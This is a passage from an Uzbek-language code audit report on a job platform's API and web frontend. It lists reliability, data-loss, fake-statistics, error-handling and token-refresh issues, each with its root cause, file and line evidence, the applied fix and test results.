- **Impact:** Parolini unutgan foydalanuvchi (10k user miqyosida kunlik hol) hisobiga kira olmaydi, support qo'lda hech narsa qila olmaydi (admin panelida ham parol o'rnatish yo'q). Google-foydalanuvchi hech qachon parol o'rnata olmaydi. Kirgan foydalanuvchi ham parolini almashtira olmaydi (buzilgan parol bo'lsa ham).
- **Evidence:** apps/web/src/pages/login/+Page.tsx:80-85; apps/api/src/modules/auth/auth.routes.ts (faqat register/login/refresh/logout/me/telegram/google); apps/api/src/modules/auth/auth.service.ts:328-330 izoh; apps/api/src/common/mailer.ts mavjud.
- **Recommended fix:** team.routes.ts:21-37 dagi invite naqshini qayta ishlating: `PasswordReset` modeli (tokenHash sha256, expiresAt 1 soat, usedAt) + `POST /api/auth/forgot` (strictRateLimit, har doim 200, email bo'lsa sendMail) + `POST /api/auth/reset` (token+password) + kirganlar uchun `POST /api/auth/change-password` (eski parol + yangi). Frontend: /forgot va /reset sahifalari (3 tilda), profil sozlamalarida parol o'zgartirish. Reset'dan keyin eski refresh tokenlarni bekor qilish uchun #6 dagi tokenVersion bilan bog'lang.
- **Dependencies:** prisma db push (yangi model); mailer.ts; #6 (tokenVersion) — reset'dan keyin sessiyalarni uzish uchun.
- **Risk:** Past: yangi endpointlar, mavjud oqimlar o'zgarmaydi.
- **Lead auditor izohi:** Yangi sahifalar va email oqimi talab qiladi — topshiriq 'yangi page boshlama' qoidasi bilan cheklangan.
- **Bajarilgan fix:** Parolni tiklash qo'shilmadi: email infratuzilmasi tasdiqlanmagan, oqim yangi sahifa talab qiladi (D-010). Qaror kerak.
- **Test/dalil:** —

### ISSUE-013

**void notify() catch'siz chaqiriladi va global unhandledRejection handler yo'q: bildirishnoma yozishdagi DB xatosi jarayonni yiqitishi mumkin**

- **Severity:** P1 (agent bahosi: P1)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** reliability
- **Fayl:** `apps/api/src/modules/applications/applications.routes.ts:69`
- **Root cause:** notify() (notifications.service.ts:55-112) `disabledChannels` va `prisma.notification.create` ni await qiladi va xato bo'lsa uloqtiradi; `sendUserEmail` (114) ham prisma so'rovini void bilan chaqiradi. Chaqiruvchilar `void notify({...})` ni `.catch` siz ishlatadi: applications.routes.ts:69, 262; admin.routes.ts:285, 354, 478; billing.routes.ts:150. Global unhandledRejection handler yo'q.
- **Impact:** DB'da vaqtinchalik xato (timeout, replica-set election) ariza yuborish/holat o'zgartirish paytida serverni o'chiradi; foydalanuvchi so'rovi esa allaqachon muvaffaqiyatli qaytgan bo'ladi.
- **Evidence:** applications.routes.ts:69, 262; admin.routes.ts:285, 354, 478; billing.routes.ts:150; notifications.service.ts:57, 64, 110, 115; server.ts (process.on faqat 210).
- **Recommended fix:** notify() ni hech qachon reject qilmaydigan qilish: har kanalni alohida try/catch ga o'rash va xatoni log qilish (`app.log`/console.warn); qo'shimcha global `unhandledRejection` handler.
- **Dependencies:** #1 (global handler)
- **Risk:** Past
- **Bajarilgan fix:** `notify()` hech qachon reject qilmaydi, kanal promise'lari ushlanadi; `unhandledRejection` log handler.
- **Test/dalil:** e2e bildirishnoma va `[ISSUE-054]` PASS; kod ko'rib chiqildi

### ISSUE-014

**notify() ga payload berilganda url bazaga yozilmaydi: ariza va obuna bildirishnomalari ro'yxatda havolasiz qoladi**

- **Severity:** P1 (agent bahosi: P1)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** notifications
- **Fayl:** `apps/api/src/modules/notifications/notifications.service.ts:70`
- **Root cause:** `payload: input.payload ?? { url: input.url ?? null }` — chaqiruvchi `payload` bersa (applications.routes.ts:75 `{applicationId, vacancyId}`, :268 `{applicationId, status}`, alerts.service.ts:169 `{savedSearchId, count}`) url payload'ga kirmaydi. `GET /api/notifications` esa url'ni faqat `urlFromPayload(n.payload)` dan o'qiydi (notifications.routes.ts:75) → `url: null`. Faqat jonli WS xabari (82) url'ni olib keladi.
- **Impact:** Asosiy 3 tur (yangi ariza, ariza holati, obuna mosligi) sahifa yangilangach yoki /notifications markazida havolasiz: NotificationCard `href=null` (canOpenTarget), qo'ng'iroqda `/notifications` ga tushadi. Email/Telegram/push'da esa havola bor — nomuvofiq.
- **Evidence:** notifications.service.ts:64-72 va :82; notifications.routes.ts:47-52, 75; applications.routes.ts:74-75, 267-268; alerts.service.ts:168-169.
- **Recommended fix:** `payload: { ...((input.payload as object) ?? {}), url: input.url ?? null }` — backward compatible (eski yozuvlar o'zgarmaydi, yangi yozuvlarda url bor).
- **Dependencies:** Yo'q
- **Risk:** Juda past
- **Bajarilgan fix:** `url` doim payload ichida (berilgan payload bilan birlashtiriladi), `safeInternalPath`.
- **Test/dalil:** e2e `[ISSUE-036/014/060]` PASS

### ISSUE-015

**To'qima raqamlar: kirish panelidagi 12 000+/6 000+/300 000+, kategoriya kartalaridagi qattiq yozilgan sonlar, ish beruvchi landingidagi 3204+/48000+ va bajarilmaydigan va'dalar**

- **Severity:** P1 (agent bahosi: P1)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** product/no-fake-data
- **Fayl:** `apps/web/src/components/AuthShell.tsx:106`
- **Root cause:** Stat qiymatlari kodga qattiq yozilgan. i18n subtitle'larida ham "12,000+ faol vakansiya" matni bor.
- **Impact:** "Yo'q ma'lumot — to'qima emas" qoidasi buziladi. Real bazada, masalan, 40 ta vakansiya bo'lsa ham foydalanuvchiga 12 000+ deb ko'rsatiladi (ishonch va huquqiy xavf).
- **Evidence:** AuthShell.tsx:106-108 <Stat value="12 000+" .../> <Stat value="6 000+" .../> <Stat value="300 000+" .../>; messages.uz.ts:95 "O'zbekiston bo'ylab 12,000+ faol vakansiya..."; messages.ru.ts:94; messages.en.ts:93.
- **Recommended fix:** Stat blokini olib tashlash yoki real /api/stats'dan olish (fetchStats). Xato yoki 0 bo'lsa blokni ko'rsatmaslik. Subtitle'lardan raqamni olib tashlash ("O'zbekiston bo'ylab faol vakansiyalar...").
- **Dependencies:** Bosh sahifadagi stats finding'i bilan bir xil manba
- **Risk:** Past.
- **Bajarilgan fix:** Kirish paneli, ish beruvchi landing, kategoriya kartalari — haqiqiy `/api/stats`/facets yoki blok yo'q; i18n (uz/ru/en) dagi "#1", "12,000+", "minglab", "moderatsiyadan o'tgach" da'volari tuzatildi (D-025).
- **Test/dalil:** web typecheck/build PASS; brauzer: bosh sahifa kategoriya sonlari API facets bilan aynan mos (it 20, savdo 21, marketing 7, moliya 13, qurilish 8, turizm 6), statistikada "+" yo'q; brauzer: 331 sahifa yuklash (360/390/430/768/1024/1280/1440, light/dark, uz/ru/en, mehmon/nomzod/ish beruvchi/admin) — 5xx/konsol xatosi/overflow yo'q
- **Birlashtirilgan manbalar (5):**
  - R026 [candidate-public, P1] `apps/web/src/components/AuthShell.tsx:106` — Login/Signup panelida to'qima marketing raqamlari (12 000+, 6 000+, 300 000+)
  - R027 [candidate-public, P1] `apps/web/src/lib/i18n/categories.ts:4` — Bosh sahifa kategoriya kartalarida to'qima vakansiya sonlari
  - R041 [employer-product, P1] `apps/web/src/pages/employer/+Page.tsx:48` — Employer landing'da to'qima statistika va backend bajarmaydigan va'dalar
  - R048 [i18n, P1] `apps/web/src/lib/i18n/categories.ts:4` — Bosh sahifadagi kategoriya sonlari qattiq yozilgan (to'qima ma'lumot)
  - R054 [responsive-dark-a11y, P1] `apps/web/src/components/AuthShell.tsx:106` — Login/signup panelida qo'lda yozilgan soxta statistika (12 000+ / 6 000+ / 300 000+)

### ISSUE-016

**Bosh sahifa SSR'da API xatosi '0 vakansiya / 0 kompaniya' va bo'sh bloklar sifatida ko'rinadi; statistikaga '+' qo'shiladi**

- **Severity:** P1 (agent bahosi: P1, P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** ux/empty-vs-error
- **Fayl:** `apps/web/src/pages/index/+data.ts:4`
- **Root cause:** fetchStats → EMPTY_STATS (api.ts:498-502), fetchVacancies → { items: [] } (280-288), fetchCompanies → [] (365-372): tarmoq xatosi yoki 5xx'da jim fallback. Sahifada xato holati yo'q, Stat CountUp suffix="+" bilan "0+" chiqadi (+Page.tsx:323). "So'nggi vakansiyalar" va "Kompaniyalar" Section'lari bo'sh grid bilan chiziladi (205-226).
- **Impact:** EMPTY ≠ ERROR qoidasi buzilgan. API vaqtincha ishlamasa, SSR sahifa (va qidiruv tizimlari keshi) "platformada 0 vakansiya, 0 kompaniya" ko'rsatadi, xato yoki qayta urinish holati yo'q.
- **Evidence:** index/+data.ts:4-13 Promise.all([fetchStats(), fetchVacancies(), fetchCompanies()]); api.ts:500 `if (!res || !res.ok) return EMPTY_STATS;` api.ts:284 `if (!res || !res.ok) return { items: [], total: 0 };` index/+Page.tsx:126-162 Stat value={stats.vacancies}.
- **Recommended fix:** +data'da /vacancies'dagi kabi naqsh: `fetchVacancyPage(...).catch(() => null)` va stats uchun ApiError tashlaydigan variant ishlatib, `null`ni xato deb uzatish. Stats null bo'lsa stat kartasini yashirish, vacancies null bo'lsa bo'limda "yuklab bo'lmadi / qayta urinish" ko'rsatish, bo'sh ro'yxatda esa bo'limni yashirish. "+" suffiksini olib tashlash.
- **Dependencies:** api.ts fetchStats/fetchVacancies boshqa joylarda ham ishlatiladi — yangi throw qiluvchi variant qo'shish xavfsizroq
- **Risk:** Past.
- **Bajarilgan fix:** Bosh sahifa bloklari mustaqil: API xatosida statistika yashiriladi, ro'yxatlarda "yuklab bo'lmadi"; statistikadagi "+" olib tashlandi.
- **Test/dalil:** web typecheck/build PASS; brauzer: bosh sahifa bloklari 390/1280 light/dark da to'liq chizildi, xato matni yo'q; brauzer: 331 sahifa yuklash (360/390/430/768/1024/1280/1440, light/dark, uz/ru/en, mehmon/nomzod/ish beruvchi/admin) — 5xx/konsol xatosi/overflow yo'q
- **Birlashtirilgan manbalar (4):**
  - R031 [candidate-public, P1] `apps/web/src/pages/index/+data.ts:4` — Bosh sahifa SSR: API xatosi "0+ vakansiya" va bo'sh bo'limlar bo'lib ko'rinadi
  - R033 [data-scale, P1] `apps/web/src/lib/api.ts:500` — Home stats API xatosida "0 vakansiya / 0 kompaniya / 0 ariza" ko'rinadi (EMPTY ≠ ERROR buzilgan)
  - R067 [validation-errors, P1] `apps/web/src/pages/index/+data.ts:3` — Bosh sahifa API xatosida '0 vakansiya / 0 kompaniya / 0 ariza' va bo'sh bloklar bilan SSR qilinadi
  - R176 [routing-seo, P2] `apps/web/src/pages/index/+data.ts:4` — Bosh sahifa SSR'da API xatosini bo'sh holat (0 statistika, bo'sh bloklar) sifatida 200 bilan beradi

### ISSUE-017

**GET /api/resume xatosi 'rezyume yo'q' deb qabul qilinadi: keyingi bo'lim saqlanishi (PUT butun hujjat) tajriba/ta'lim/ko'nikmalarni o'chirib yuboradi; load va saqlash navbati poygasi**

- **Severity:** P1 (agent bahosi: P1, P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** data-loss
- **Fayl:** `apps/web/src/lib/profile/useProfileData.ts:109`
- **Root cause:** fetchResume xatoda ham null qaytaradi (api.ts:537-542). load() profil muvaffaqiyatli bo'lsa status="ready" qo'yadi va resumeRef.current=null qoladi (66-77). saveResume esa `{ ...EMPTY_RESUME, ...(resumeRef.current ?? {}), ...patch }` yuboradi. PUT /api/resume butun hujjatni almashtiradi (resume.routes.ts:142-147 deleteMany + createMany).
- **Impact:** GET /api/resume vaqtincha 5xx yoki timeout bo'lsa, nomzod faqat bitta ko'nikma qo'shganda serverdagi barcha experience/education/skills yozuvlari o'chadi va summary null bo'ladi. Qaytarib bo'lmaydigan ma'lumot yo'qotilishi.
- **Evidence:** useProfileData.ts:66 `const [p, r, reg] = await Promise.all([fetchProfile(token), fetchResume(token), fetchRegions()]);` 70-77 faqat `!p` bo'lsa error; 109 merged EMPTY_RESUME bilan; 112 putResume(token, toInput(merged, fallback)). api.ts:539 `if (!res || !res.ok) return null;`
- **Recommended fix:** Rezyume uchun alohida fetch: 200 bo'lsa `json.resume` (null bo'lishi mumkin — haqiqatan rezyume yo'q), xatoda throw. load()'da rezyume xatosi bo'lsa status="error" (yoki resumeStatus="error") qo'yib, saveResume'ni bloklash. Backend tarafda qo'shimcha himoya: PUT'ga `If-Match`/updatedAt yoki bo'lim bo'yicha PATCH.
- **Dependencies:** useApplication.ts ham fetchResume'dan foydalanadi (alohida finding)
- **Risk:** Past-o'rta: profil sahifasida yangi xato holati paydo bo'ladi.
- **Bajarilgan fix:** `fetchResume` xatoda uloqtiradi; profil xato holatini ko'rsatadi (keyingi PUT ma'lumotni o'chirmaydi); `useApplication`, `useProfileCompletion` moslashtirildi.
- **Test/dalil:** web typecheck/build PASS; brauzer E5: /api/resume 500 → profil xato holati (bo'sh forma emas) PASS
- **Birlashtirilgan manbalar (3):**
  - R028 [candidate-public, P1] `apps/web/src/lib/profile/useProfileData.ts:109` — GET /api/resume xatosida rezyume bo'sh deb qabul qilinadi, keyingi saqlash butun tajriba/ta'lim/ko'nikmalarni o'chiradi
  - R044 [frontend-state, P1] `apps/web/src/lib/profile/useProfileData.ts:75` — load() javobi resumeRef'ni saqlash navbatidan mustaqil ustidan yozadi — to'liq-hujjat PUT keyingi saqlashda o'zgarishni o'chirishi mumkin
  - R204 [validation-errors, P2] `apps/web/src/lib/api.ts:537` — `fetchResume`/`fetchMyCompany`/`fetchTelegramStatus` xatoda 'ma'lumot yo'q' qiymatini qaytaradi — rezyume/kompaniya/telefon tasdiqlash holati noto'g'ri ko'rinadi

### ISSUE-018

**Kompaniya profili yuklanmasa bo'sh forma chiziladi, saqlansa mavjud kompaniya ma'lumotlari null bilan ustidan yoziladi**

- **Severity:** P1 (agent bahosi: P1)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** data-loss
- **Fayl:** `apps/web/src/lib/api.ts:663`
- **Root cause:** `fetchMyCompany` !ok yoki tarmoq xatosida `null` qaytaradi. EmployerProfile buni 'kompaniya yo'q' deb talqin qilib bo'sh forma chizadi (profile/+Page.tsx:251-255, 286). Saqlashda `description/website/regionId/industry/... : null` yuboriladi (EmployerCompanyForm.tsx:82-90). PUT upsert mavjud kompaniyani topib, shu null'lar bilan yangilaydi (companies.routes.ts:88-103). fetchRegions xatosi ham xuddi shunday: bo'sh select, regionId null bo'lib ketadi.
- **Impact:** Vaqtinchalik 5xx yoki tarmoq uzilishida employer 'profil bo'sh' deb o'ylaydi, nomni yozib saqlaydi va tavsif, sayt, hudud, soha, xodimlar soni, tashkil topgan yil o'chib ketadi. Rule 4 buziladi va ma'lumot yo'qoladi.
- **Evidence:** api.ts:659-666; pages/profile/+Page.tsx:244-256; EmployerCompanyForm.tsx:81-90; companies.routes.ts:90-103.
- **Recommended fix:** fetchMyCompany xatoda ApiError otsin (200 bo'lib `company: null` kelgandagina null qaytarsin). EmployerProfile'da `error` holati va qayta urinish tugmasi bo'lsin, forma faqat muvaffaqiyatli yuklanganda chizilsin. Regions yuklanmasa ham error. `lib/employer/vacancies/api.ts` dagi `getJson` pattern'ini qayta ishlatish mumkin.
- **Dependencies:** fetchMyCompany'dan boshqa joylar ham foydalanishi mumkin (grep qiling).
- **Risk:** Past
- **Bajarilgan fix:** `fetchMyCompany` va hududlar xatoda uloqtiradi; ish beruvchi profili xato holati + qayta urinish, bo'sh forma chizilmaydi.
- **Test/dalil:** web typecheck/build PASS; brauzer E6: /api/employer/company 500 → xato holati PASS

### ISSUE-019

**Har 12 daqiqalik token yangilanishida /profile skeletga qaytadi (saqlanmagan qoralama yo'qoladi), /messages ro'yxati va ochiq suhbat qayta yuklanadi, WS qayta ulanadi**

- **Severity:** P1 (agent bahosi: P1, P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** frontend/state
- **Fayl:** `apps/web/src/lib/messages/useMessenger.ts:324`
- **Root cause:** `reloadList` `useCallback(..., [token])` (65-88); `useEffect(() => { void reloadList(); }, [reloadList])` (324-326) token har 12 daqiqada o'zgarganda qayta ishlaydi va `silent=false` bo'lgani uchun `setList({status:"loading"})` qiladi. MessagesView.tsx:63-66 `items = []` bo'lganda `active = null` → ConversationPane unmount, composer ichidagi matn `key`li MessageComposer bilan qayta tug'iladi (draft Map'da saqlanadi, lekin fokus/scroll yo'qoladi). Qo'shimcha: useChatSocket.ts:26-80 effekt `[token]` ga bog'liq → WS uziladi va qayta ulanadi, `everOpened` lokal bo'lgani uchun `onOpen(false)` → 218-223 dagi 'o'tkazib yuborilganlarni yuklash' ishlamaydi.
- **Impact:** Har 12 daqiqada /messages skeletga tushadi, chat oynasi bir lahza yo'qoladi; qayta ulanish oralig'ida kelgan xabar reload'gacha ko'rinmaydi.
- **Evidence:** useMessenger.ts:68 `if (!silent) setList({ status: "loading" });`, :87 `[token]`, :324-326; useChatSocket.ts:31 `let everOpened = false;` (effekt ichida), :80 `[token]`.
- **Recommended fix:** useMessenger'da `tokenRef` ishlating, `reloadList/loadThread` deps bo'sh; mount effekt bir marta. useChatSocket'da `everOpened`ni `useRef` ga chiqaring va token o'zgarganda qayta ulanishni `reconnected=true` deb bering (yoki token'ni ref orqali o'qib, faqat close bo'lganda yangi token bilan ulansin).
- **Dependencies:** useChatSocket.ts, MessagesView.tsx.
- **Risk:** Past.
- **Bajarilgan fix:** Token do'koni: fondagi yangilanish React holatini o'zgartirmaydi — profil, xabarlar va socket qayta yuklanmaydi (D-023). PHASE 6: Boshqa hisob tokenini olmaslik va seans davri (ISSUE-105, ISSUE-131).
- **Test/dalil:** web typecheck/build PASS; 12 daqiqalik yangilanishni avtomatik sinovchi test yo'q
- **Birlashtirilgan manbalar (3):**
  - R042 [frontend-state, P1] `apps/web/src/lib/messages/useMessenger.ts:324` — Token yangilanganda suhbatlar ro'yxati 'loading' ga tushadi va ochiq suhbat paneli yo'qoladi
  - R043 [frontend-state, P1] `apps/web/src/lib/profile/useProfileData.ts:80` — Har 12 daqiqada token yangilanganda /profile butunlay skeletga qaytadi — saqlanmagan qoralamalar yo'qoladi
  - R245 [realtime-notifications, P3] `apps/web/src/lib/useChatSocket.ts:80` — Har 12 daqiqalik token yangilanishida socket qayta ochiladi va bu 'reconnect' hisoblanmaydi — oradagi xabarlar UI'da yo'qoladi

### ISSUE-020

**401 uchun refresh+qayta urinish yo'q; tarmoq xatosi 'mehmon' holatiga aylanadi va token o'chiriladi; mount va login() poygasi**

- **Severity:** P1 (agent bahosi: P1, P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** frontend/auth
- **Fayl:** `apps/web/src/components/AuthContext.tsx:75`
- **Root cause:** Access token 15 daqiqa; AuthContext faqat `setInterval(12 min)` (75-85) bilan yangilaydi. Brauzer fon tabda taymerlarni to'xtatadi / noutbuk uyqudan uyg'onganda token allaqachon eskirgan bo'ladi. Hech bir fetch qatlamida (api.ts `authGet` 715-719, apiExtra.ts `get` 44-48, `send` 51-71, lib/*/api.ts) 401 kelganda `refreshAccessToken()` + qayta urinish yoki `status = guest` mantiqi yo'q; faqat useApplication.ts:79 login'ga yo'naltiradi. Bundan tashqari `fetchMe` (api.ts:160-164) tarmoq/5xx xatosida ham `null` qaytaradi, AuthContext (42-66) buni "token yaroqsiz" deb localStorage'ni tozalab guest qiladi.
- **Impact:** Eskirgan token bilan: `authGet`/`get` ga tayangan sahifalar (kandidatlar, obunalar, admin jadvallari, profil SavedJobs, header sonlari) jimgina BO'SH holat ko'rsatadi; `ApiError` uloqtiruvchi sahifalar (employer vakansiyalar/murojaatlar, xabarlar, sevimlilar, bildirishnomalar) "Qayta urinish" ko'rsatadi, lekin tugma o'sha eskirgan tokenni qayta yuboradi → yana 401 → foydalanuvchi sahifani to'liq yangilamaguncha chiqib keta olmaydi. API vaqtincha 5xx bersa foydalanuvchi mijoz tomonda 'chiqib ketadi'.
- **Evidence:** AuthContext.tsx:77-83 `window.setInterval(async () => { const fresh = await refreshAccessToken(); ... }, 12*60*1000)`; api.ts:715-719 `authGet ... if (!res || !res.ok) return fallback;`; api.ts:160-164 `fetchMe ... if (!res || !res.ok) return null;`; grep `status === 401` faqat useApplication.ts:79.
- **Recommended fix:** Bitta `authFetch(path, init)` yordamchisi: 401 kelsa `refreshAccessToken()` (bir marta, in-flight promise bilan deduplikatsiya), localStorage + context tokenni yangilab so'rovni qayta yuboradi; refresh ham bo'sh qaytsa `logout()`/guest holati va login'ga yo'naltirish. `fetchMe` 401 va tarmoq/5xx ni farqlasin (5xx'da tokenni o'chirmaslik). `visibilitychange`/`focus` da refresh.
- **Dependencies:** api.ts, apiExtra.ts, lib/**/api.ts, lib/admin/http.ts — barcha fetch qatlamlari
- **Risk:** O'rta — barcha so'rov yo'llariga tegadi; refresh cookie SameSite=None prod sozlamasi o'zgarmaydi
- **Bajarilgan fix:** API fetch interceptor: 401 → bitta umumiy refresh + qayta urinish; tarmoq xatosi mehmon holatiga olib bormaydi; kirish/chiqish avlod hisoblagichi. PHASE 6: Refresh route vaqtinchalik baza xatosida cookie'ni tozalamaydi (ISSUE-113); 403 `USER_BLOCKED` da mehmon holati (ISSUE-108).
- **Test/dalil:** web typecheck/build PASS; brauzer S1: /api/applications birinchi javobi 401 → refresh 1 marta → qayta urinish, sahifa yuklandi (login'ga otmadi) PASS
- **Birlashtirilgan manbalar (5):**
  - R064 [validation-errors, P1] `apps/web/src/components/AuthContext.tsx:75` — 401 (token eskirgan) uchun qayta-refresh yo'li yo'q — fon tab/uyqudan keyin sahifalar bo'sh holat yoki 'Qayta urinish' tuzog'ida qotib qoladi
  - R072 [auth, P2] `apps/web/src/components/AuthContext.tsx:40` — Tarmoq/API xatosi "mehmon" holati sifatida ko'rinadi: fetchMe null qaytarsa saqlangan token o'chiriladi (EMPTY ≠ ERROR buzilgan)
  - R073 [auth, P2] `apps/web/src/components/AuthContext.tsx:75` — API mijozida 401 -> refresh -> retry yo'q; faqat 12 daqiqalik interval — uyqudan uyg'ongan tab/telefon birinchi so'rovlarda 401 oladi
  - R134 [frontend-state, P2] `apps/web/src/components/AuthContext.tsx:77` — 401 → refresh yo'li yo'q: bitta refresh muvaffaqiyatsiz bo'lsa 15-24 daqiqa oralig'ida hamma so'rov 401, status 'authed' bo'lib qoladi
  - R135 [frontend-state, P2] `apps/web/src/components/AuthContext.tsx:62` — Mount'dagi seansni tiklash va login() poygasi — login natijasi 'guest' bilan ustidan yozilishi mumkin

### ISSUE-021

**Admin ro'yxat sahifalari API xatosini bo'sh jadval deb ko'rsatadi, eski javob yangisini yozadi, amal xatolari yutiladi; overview xatoda abadiy skeletda**

- **Severity:** P1 (agent bahosi: P1)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** ux/empty-vs-error
- **Fayl:** `apps/web/src/pages/admin/users/+Page.tsx:35`
- **Root cause:** users/vacancies/companies/reviews/payments sahifalarida `load = useCallback(() => void fetchAdminX(...).then(setData), [...filters])` + `useEffect(load, [load])`: abort/sequence yo'q — filtr/sahifa tez o'zgarsa sekin eski javob keyin kelib yangi filtr ustiga yoziladi. apiExtra.ts:44-48 `get` xatoda `emptyPage()` qaytaradi → 88-91 'foydalanuvchi yo'q' (EMPTY ≠ ERROR); admin/+Page.tsx:33-35 `fetchAdminOverview` xatoda `null` → skelet abadiy. Qator amallari (`toggleBlock` 40-45, `changeRole` 47-52, vacancies `moderate` 42-55, reviews `apply/drop` 38-49, payments `confirm` 38-43) `.catch(() => undefined)` bilan xatoni yutadi va `busy` yo'q — ikki marta bosish ikki PATCH.
- **Impact:** Admin noto'g'ri sahifa/filtr ma'lumotini ko'radi, server xatosini 'ma'lumot yo'q' deb tushunadi, moderatsiya amali muvaffaqiyatsiz bo'lsa bilmaydi.
- **Evidence:** users/+Page.tsx:33-38; vacancies/+Page.tsx:35-40, :53; companies/+Page.tsx:32-37; reviews/+Page.tsx:31-36; payments/+Page.tsx:31-36; admin/+Page.tsx:30-39, :60-67.
- **Recommended fix:** AdminArticleList.tsx:45-56 naqshiga o'ting: `useEffect` ichida AbortController + `state: loading|error|ready`, xato uloqtiradigan `adminRequest` (lib/admin/http.ts) bilan; amallar uchun `busyId` + `useNotice` (lib/admin/useNotice.ts) orqali xato xabari.
- **Dependencies:** lib/apiExtra.ts admin fetcher'lari (yoki lib/admin/http.ts ga ko'chirish).
- **Risk:** Past-o'rta: 5 ta sahifa bir xil refaktor.
- **Bajarilgan fix:** Admin sahifalari (6 ta): `useAdminResource` (AbortController, xato holati, haqiqiy retry), amal xatolari `AdminNotice` da. PHASE 6: Filtr o'zgarganda eski jadval ko'rsatilmaydi (ISSUE-137).
- **Test/dalil:** web typecheck/build PASS; brauzer E3 (/admin/users 500) va E4 (/admin/overview 500) → AdminError PASS; brauzer: 331 sahifa yuklash (360/390/430/768/1024/1280/1440, light/dark, uz/ru/en, mehmon/nomzod/ish beruvchi/admin) — 5xx/konsol xatosi/overflow yo'q
- **Birlashtirilgan manbalar (2):**
  - R045 [frontend-state, P1] `apps/web/src/pages/admin/users/+Page.tsx:35` — Admin ro'yxat sahifalari: eski javob yangisini yozadi, API xatosi bo'sh jadval bo'lib ko'rinadi, amallar guard'siz va xatosiz
  - R065 [validation-errors, P1] `apps/web/src/lib/apiExtra.ts:44` — Admin sahifalari (users/vacancies/companies/reviews/payments) API xatosini 'bo'sh ro'yxat' deb ko'rsatadi, overview esa abadiy skeletda qoladi

### ISSUE-022

**/alerts, profil 'Saqlanganlar' va sevimlilar ID'lari API xatosini bo'sh holat deb ko'rsatadi**

- **Severity:** P1 (agent bahosi: P1)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** ux/empty-vs-error
- **Fayl:** `apps/web/src/pages/alerts/+Page.tsx:21`
- **Root cause:** fetchSavedSearches apiExtra.get() orqali xatoda { items: [] } qaytaradi (apiExtra.ts:44-48, 203-206). Sahifada error holati yo'q, faqat loading, bo'sh yoki ro'yxat bor. O'zgartirish/o'chirishdagi xatolar ham jim yutiladi (49-qator).
- **Impact:** Nomzodning saqlangan qidiruvlari bor bo'lsa ham, server xatosida "hali obuna yo'q" deyiladi. Foydalanuvchi obunani qayta yaratishi mumkin (MAX_PER_USER=20 limitiga tez yetadi).
- **Evidence:** alerts/+Page.tsx:21-27 fetchSavedSearches(accessToken).then(setItems).finally(setLoading(false)); 77 `items.length === 0 ? ... {t.alerts.empty}`; apiExtra.ts:204 get("/api/saved-searches", token, { items: [] }).
- **Recommended fix:** lib/favorites/api.ts fetchSavedVacancies naqshida throw qiluvchi fetch yozish va useRemoteList (lib/profile/useProfileData.ts:144) bilan status: loading/ready/error qilish. Xatoda retry tugmasi ko'rsatish. changeFrequency xatosida optimistik o'zgarishni qaytarish.
- **Dependencies:** i18n'ga alerts.error kaliti (uz/ru/en + types.ts)
- **Risk:** Past.
- **Bajarilgan fix:** Obunalar, saqlanganlar ID'lari va profil "Saqlanganlar" xatoni uloqtiruvchi fetcher'lar bilan; xato holati va qayta urinish.
- **Test/dalil:** web typecheck/build PASS; brauzer E2: /api/saved-searches 500 → xato holati, "Obunalar yo'q" ko'rinmadi PASS
- **Birlashtirilgan manbalar (3):**
  - R029 [candidate-public, P1] `apps/web/src/pages/alerts/+Page.tsx:21` — /alerts: API xatosi "Obunalar yo'q" bo'sh holati bo'lib ko'rinadi
  - R046 [frontend-state, P1] `apps/web/src/pages/alerts/+Page.tsx:21` — Obunalar (/alerts) va sevimlilar ID'lari: API xatosi bo'sh holat sifatida ko'rinadi
  - R066 [validation-errors, P1] `apps/web/src/pages/alerts/+Page.tsx:21` — Obunalar (/alerts) va profil 'Saqlangan vakansiyalar' sahifasida API xatosi bo'sh holat sifatida ko'rinadi

### ISSUE-023

**Nomzodlar sahifasi: qidiruv so'rovlari poygasi, xato 'nomzod yo'q' bo'lib ko'rinadi, 'Xabar yozish' takroriy bosishdan himoyalanmagan**

- **Severity:** P1 (agent bahosi: P1)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** frontend/state
- **Fayl:** `apps/web/src/pages/employer/candidates/+Page.tsx:36`
- **Root cause:** 28-34 mount effekti va 36-44 `runSearch` bir-biridan xabarsiz `setItems` qiladi — abort/sequence yo'q: tez ketma-ket qidiruvda eski javob yangisini yozadi; boshlang'ich fetch tugamay turib qidirilsa initial javob qidiruv natijasini bosadi. `fetchCandidates` (api.ts:779-782) `authGet` orqali xatoda `[]` qaytaradi → 100-104 bo'sh holat chiqadi (EMPTY ≠ ERROR buzilgan). Qidiruv tugmasi (87-92) hech qachon disabled emas; `openChat` (46-54) busy guard'siz — ikki bosish ikki `startConversation` + ikki `location.assign`.
- **Impact:** Noto'g'ri natijalar ro'yxati, server yiqilganda 'nomzodlar topilmadi' degan yolg'on holat, takroriy so'rovlar.
- **Evidence:** +Page.tsx:30-33 `.then((c) => { setItems(c); setLoading(false); })` cancel yo'q; :41-43 `const c = await fetchCandidates(...); setItems(c);`; api.ts:715-719 `authGet` `if (!res || !res.ok) return fallback;`.
